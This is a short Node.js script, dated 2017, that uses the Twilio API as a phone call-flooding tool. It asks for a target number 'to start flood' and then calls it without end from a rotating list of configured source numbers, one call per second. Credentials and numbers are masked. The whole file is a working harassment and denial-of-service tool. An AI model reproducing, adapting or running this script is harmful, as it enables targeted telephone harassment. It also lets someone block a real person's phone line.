/*
Misanya Liu
7/12/17
I've stared this code!
*/
let accountSid = '*************';//Config Here
let authToken = '**************';//Config Here
let client = require('twilio')(accountSid, authToken);
let readline = require('readline');

let numbers = ['+10000000000','+10000000000','+10000000000','+10000000000'];//Config Here
let toNumber = '+86**********';
let count = 1;

const appName ='===SOUP===';
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const callPhone = (fromNumber)=>{
    client.calls.create({
        url: "http://demo.twilio.com/docs/voice.xml",// add your own TwiML file path here.
        to: toNumber,
        from: fromNumber
    }, function(err, call) {
        if(call){
            console.log(call.sid);
        }
        console.log(err);
    });
}

const launchCall = ()=>{
    console.log('Trying Count: '+ count);

    for(let ix = 0;ix < numbers.length;ix++){
        setTimeout(callPhone,1000*ix,numbers[ix]);
    }

    setTimeout(launchCall,1000*numbers.length);
    count++;
};

// Entrance of Main
console.log(appName);
rl.question('Enter the target numbe to start flood(+1 MUST BE IN FRONT!):',(answer)=>{
    console.log(`Trying to call this number: ${answer}`);
    toNumber = answer;

    rl.close();

    launchCall();
});


   
